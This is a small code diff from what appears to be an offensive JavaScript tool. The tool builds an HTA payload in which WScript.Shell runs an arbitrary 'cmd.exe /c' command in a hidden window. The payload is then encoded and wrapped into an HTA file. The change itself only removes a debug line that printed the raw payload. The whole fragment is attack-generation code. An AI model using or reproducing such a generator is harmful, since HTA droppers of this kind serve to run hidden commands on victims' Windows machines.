@@ -42,7 +42,6 @@ if (args[2] == null)
 } else {
 	var cmd = args[2]
 	var payload = `a=new ActiveXObject("WScript.Shell");a.run("cmd.exe /c ${cmd}", 0);window.close();`
-	console.log(payload)
 	var ehta = e(payload)
 	var hta = gen(ehta)
 	console.log(hta);
